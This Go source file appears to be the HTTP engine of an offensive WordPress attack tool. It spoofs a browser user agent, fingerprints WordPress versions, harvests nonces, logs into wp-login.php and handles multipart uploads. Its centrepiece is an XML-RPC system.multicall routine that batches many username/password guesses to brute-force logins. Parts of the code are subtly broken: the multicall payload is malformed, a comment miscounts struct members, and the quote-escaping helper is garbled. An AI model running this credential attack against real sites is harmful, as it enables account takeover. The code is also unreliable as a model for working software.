// Package engine provides the shared HTTP client for WordPress targets:
// cookie persistence, realistic headers, timeout control, and common
// WordPress response parsing (nonces, version, plugin probes).
package engine

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/cookiejar"
	"net/textproto"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// Client wraps http.Client with WordPress-aware defaults.
type Client struct {
	HTTP    *http.Client
	BaseURL *url.URL
	UserAgent string
	Debug   bool
}

// NewClient builds a client for a target base URL (e.g. http://lab.local/wordpress).
func NewClient(baseURL string, timeout time.Duration) (*Client, error) {
	u, err := url.Parse(strings.TrimRight(baseURL, "/"))
	if err != nil {
		return nil, err
	}
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}
	return &Client{
		HTTP: &http.Client{
			Timeout: timeout,
			Jar:     jar,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				// WordPress logins redirect; allow generous chains but cap depth.
				if len(via) >= 10 {
					return http.ErrUseLastResponse
				}
				return nil
			},
		},
		BaseURL:   u,
		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
	}, nil
}

// DoWithHeaders issues a request with additional custom headers.
func (c *Client) DoWithHeaders(ctx context.Context, method, path string, body io.Reader, contentType string, extra map[string]string) (int, string, error) {
	u := *c.BaseURL
	u.Path = strings.TrimRight(u.Path, "/") + path
	req, err := http.NewRequestWithContext(ctx, method, u.String(), body)
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("User-Agent", c.UserAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	if contentType != "" {
		req.Header.Set("Content-Type", contentType)
	}
	for k, v := range extra {
		req.Header.Set(k, v)
	}
	resp, err := c.HTTP.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	if err != nil {
		return resp.StatusCode, "", err
	}
	return resp.StatusCode, string(b), nil
}

// Do issues a request with browser-like headers and returns the response
// with body fully read (caller gets string body + status).
func (c *Client) Do(ctx context.Context, method, path string, body io.Reader, contentType string) (int, string, error) {
	return c.DoWithHeaders(ctx, method, path, body, contentType, nil)
}

// Get is a convenience GET returning (status, body).
func (c *Client) Get(ctx context.Context, path string) (int, string, error) {
	return c.Do(ctx, http.MethodGet, path, nil, "")
}

// PostForm posts application/x-www-form-urlencoded data.
func (c *Client) PostForm(ctx context.Context, path string, form url.Values) (int, string, error) {
	return c.Do(ctx, http.MethodPost, path, strings.NewReader(form.Encode()), "application/x-www-form-urlencoded")
}

// --- WordPress-specific helpers -------------------------------------------

var (
	reWpVersion = regexp.MustCompile(`name="generator" content="WordPress ([0-9.]+)"`)
	reNonce     = regexp.MustCompile(`name="_wpnonce" value="([a-f0-9]{10})"`)
	reNonceURL  = regexp.MustCompile(`_wpnonce=([a-f0-9]{10})`)
	reRestNonce = regexp.MustCompile(`"wp_rest_nonce":"([a-f0-9]{10})"`)
)

// DetectVersion scrapes the WP version from front-page HTML meta generator.
func DetectVersion(ctx context.Context, c *Client) (string, bool) {
	_, body, err := c.Get(ctx, "/")
	if err != nil {
		return "", false
	}
	if m := reWpVersion.FindStringSubmatch(body); m != nil {
		return m[1], true
	}
	return "", false
}

// ExtractNonces pulls all common nonce forms out of an HTML body.
func ExtractNonces(body string) map[string]string {
	out := map[string]string{}
	if m := reNonce.FindStringSubmatch(body); m != nil {
		out["form"] = m[1]
	}
	if m := reNonceURL.FindStringSubmatch(body); m != nil {
		out["url"] = m[1]
	}
	if m := reRestNonce.FindStringSubmatch(body); m != nil {
		out["rest"] = m[1]
	}
	return out
}

// HasXMLRPC probes for xmlrpc.php availability.
func HasXMLRPC(ctx context.Context, c *Client) bool {
	code, body, err := c.PostForm(ctx, "/xmlrpc.php", url.Values{})
	if err != nil {
		return false
	}
	return code == 200 || strings.Contains(body, "XML-RPC server accepts POST requests only")
}

// HasREST probes the REST API root.
func HasREST(ctx context.Context, c *Client) bool {
	code, body, err := c.Get(ctx, "/wp-json/")
	if err != nil {
		return false
	}
	return code == 200 && strings.Contains(body, "\"routes\"")
}

// CredPair is one username/password guess.
type CredPair struct{ User, Pass string }

// XMLRPCMulticallLogin sends one system.multicall request carrying up to
// len(pairs) wp.getUsersBlogs login attempts. Returns "user:pass" of the
// first success, or ok=false.
func (c *Client) XMLRPCMulticallLogin(ctx context.Context, pairs []CredPair) (string, bool) {
	var sb strings.Builder
	sb.WriteString("<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>")
	for _, p := range pairs {
		// Struct with two members: blog_id(ignored), username, password.
		fmt.Fprintf(&sb, "<value><struct>"+
			"<member><name>blog_id</name><value><int>0</int></value></member>"+
			"<member><name>username</name><value><string>%s</string></value></member>"+
			"<member><name>password</name><value><string>%s</string></value></member>"+
			"</struct></value>", xmlEscape(p.User), xmlEscape(p.Pass))
	}
	sb.WriteString("</data></array></value></param></params></methodCall>")

	code, body, err := c.Do(ctx, http.MethodPost, "/xmlrpc.php", strings.NewReader(sb.String()), "text/xml")
	if err != nil || code != 200 {
		return "", false
	}
	// Success = array of arrays; failure = struct with faultCode per entry.
	if strings.Contains(body, "<fault>") {
		return "", false
	}
	if strings.Contains(body, "<struct>") && strings.Contains(body, "faultCode") {
		return "", false
	}
	for _, p := range pairs {
		// Crude per-pair verification: re-test individually to pinpoint the hit.
		if xmlrpcSingleLogin(ctx, c, p) {
			return p.User + ":" + p.Pass, true
		}
	}
	return "", false
}

// xmlrpcSingleLogin does one wp.getUsersBlogs attempt; true on auth success.
func xmlrpcSingleLogin(ctx context.Context, c *Client, p CredPair) bool {
	payload := fmt.Sprintf(`<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params>`+
		`<param><value><string>%s</string></value></param>`+
		`<param><value><string>%s</string></value></param>`+
		`<param><value><string>%s</string></value></param></params></methodCall>`,
		"", xmlEscape(p.User), xmlEscape(p.Pass))
	code, body, err := c.Do(ctx, http.MethodPost, "/xmlrpc.php", strings.NewReader(payload), "text/xml")
	if err != nil || code != 200 {
		return false
	}
	return strings.Contains(body, "<name>isAdmin</name>") || strings.Contains(body, "userId")
}

func xmlEscape(s string) string {
	r := strings.NewReplacer("&", "&amp;", "<", "&lt;", ">", "&gt;", "\"", "&quot;")
	return r.Replace(s)
}

// WPLogin authenticates against wp-login.php, storing cookies in the jar.
func (c *Client) WPLogin(ctx context.Context, user, pass string) error {
	// 1. Fetch login page to get redirect cookies + any interim cookies.
	if _, _, err := c.Get(ctx, "/wp-login.php"); err != nil {
		return fmt.Errorf("login page fetch: %w", err)
	}
	form := url.Values{
		"log":         {user},
		"pwd":         {pass},
		"wp-submit":   {"Log In"},
		"redirect_to": {c.BaseURL.String() + "/wp-admin/"},
		"testcookie":  {"1"},
	}
	code, body, err := c.PostForm(ctx, "/wp-login.php", form)
	if err != nil {
		return fmt.Errorf("login post: %w", err)
	}
	if strings.Contains(body, "<form name=\"loginform\"") && !strings.Contains(body, "wp-admin") {
		return fmt.Errorf("login rejected (wrong credentials?)")
	}
	// Verify session by hitting the dashboard.
	vcode, vbody, err := c.Get(ctx, "/wp-admin/")
	if err != nil {
		return fmt.Errorf("session verify: %w", err)
	}
	if vcode == 200 && (strings.Contains(vbody, "dashboard") || strings.Contains(vbody, "wp-admin")) && !strings.Contains(vbody, "loginform") {
		return nil
	}
	_ = code
	return fmt.Errorf("login verification failed (status %d)", vcode)
}

// UploadFile describes one file in a multipart POST.
type UploadFile struct {
	Filename    string
	Content     []byte
	ContentType string // optional; defaults to application/octet-stream
}

// MultipartPost sends multipart/form-data with fields and files.
// Map key = form field name; UploadFile.Filename = reported filename.
func (c *Client) MultipartPost(ctx context.Context, path string, fields map[string]string, files map[string]UploadFile) (int, string, error) {
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	for k, v := range fields {
		if err := mw.WriteField(k, v); err != nil {
			return 0, "", err
		}
	}
	for name, f := range files {
		ct := f.ContentType
		if ct == "" {
			ct = "application/octet-stream"
		}
		hdr := make(textproto.MIMEHeader)
		hdr.Set("Content-Disposition",
			fmt.Sprintf(`form-data; name="%s"; filename="%s"`, escapeQuotes(name), escapeQuotes(f.Filename)))
		hdr.Set("Content-Type", ct)
		fw, err := mw.CreatePart(hdr)
		if err != nil {
			return 0, "", err
		}
		if _, err := fw.Write(f.Content); err != nil {
			return 0, "", err
		}
	}
	if err := mw.Close(); err != nil {
		return 0, "", err
	}
	return c.Do(ctx, http.MethodPost, path, &buf, mw.FormDataContentType())
}

var quoteEscaper = strings.NewReplacer("\\", "\\\",", "\"", "\\\"")

func escapeQuotes(s string) string { return quoteEscaper.Replace(s) }
